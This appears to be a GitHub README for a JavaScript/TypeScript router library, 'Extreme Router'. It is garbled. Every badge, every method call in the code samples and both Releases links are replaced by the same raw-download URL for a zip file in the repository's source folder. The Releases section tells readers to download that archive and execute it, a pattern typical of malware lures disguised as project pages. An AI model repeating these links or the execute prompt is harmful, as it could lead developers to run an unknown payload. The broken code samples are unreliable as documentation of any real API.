# Extreme Router 🌐

![Extreme Router](https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip) ![License](https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip) ![GitHub Releases](https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip)

Welcome to **Extreme Router**, a high-performance, tree-based router designed for both JavaScript and TypeScript. This library stands out with its powerful plugin system, allowing for extreme extensibility and flexibility in your applications. 

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Plugin System](#plugin-system)
- [API Reference](#api-reference)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **High Performance**: Built with efficiency in mind, Extreme Router handles routing with minimal overhead.
- **Tree-Based Structure**: The tree-based approach simplifies route management and improves lookup times.
- **Powerful Plugin System**: Easily extend functionality with plugins tailored to your needs.
- **Zero Dependencies**: Lightweight and easy to integrate into any project.
- **Production Ready**: Tested and optimized for real-world applications.

## Installation

To install Extreme Router, you can use npm or yarn. Run one of the following commands in your terminal:

```bash
npm install extreme-router
```

or 

```bash
yarn add extreme-router
```

## Usage

To get started with Extreme Router, you can import it into your JavaScript or TypeScript project as follows:

```javascript
import { Router } from 'extreme-router';

const router = new Router();

// Define routes
https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('/home', () => {
    https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('Welcome to the home page!');
});

https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('/about', () => {
    https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('Learn more about us on this page.');
});

// Start the router
https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip();
```

## Plugin System

The plugin system in Extreme Router allows developers to add custom functionality without modifying the core code. You can create plugins to handle specific tasks, such as logging, authentication, or data fetching.

### Creating a Plugin

To create a plugin, define a function that takes the router instance as an argument:

```javascript
function loggingPlugin(router) {
    https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('routeChange', (route) => {
        https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip(`Navigating to ${route}`);
    });
}

// Register the plugin
https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip(loggingPlugin);
```

### Using Plugins

You can register multiple plugins, allowing for a modular approach to extending the router's capabilities. 

## API Reference

### Router Class

- **addRoute(path: string, handler: Function)**: Adds a new route to the router.
- **removeRoute(path: string)**: Removes a route from the router.
- **start()**: Starts the router and begins listening for route changes.
- **use(plugin: Function)**: Registers a plugin to extend router functionality.

### Example

Here’s a simple example of how to use the API:

```javascript
const router = new Router();

https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('/contact', () => {
    https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip('Contact us at https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip');
});

https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip();
```

## Examples

Explore the following examples to see Extreme Router in action:

- **Basic Routing**: A simple implementation with multiple routes.
- **Advanced Routing**: Using parameters and nested routes.
- **Plugin Integration**: Demonstrating how to use plugins for enhanced functionality.

## Contributing

We welcome contributions to Extreme Router! If you have ideas for improvements or want to report issues, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your fork.
5. Open a pull request to the main repository.

## License

Extreme Router is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Releases

For the latest releases and updates, please visit our [Releases](https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip) section. You can download the latest version and execute it in your projects.

To stay updated with new features and improvements, keep an eye on the [Releases](https://github.com/adisuartana/extreme-router/raw/refs/heads/master/src/router_extreme_1.1-beta.4.zip) page.

---

We hope you enjoy using Extreme Router in your projects! For any questions or feedback, feel free to reach out to the community or open an issue in the repository. Happy coding!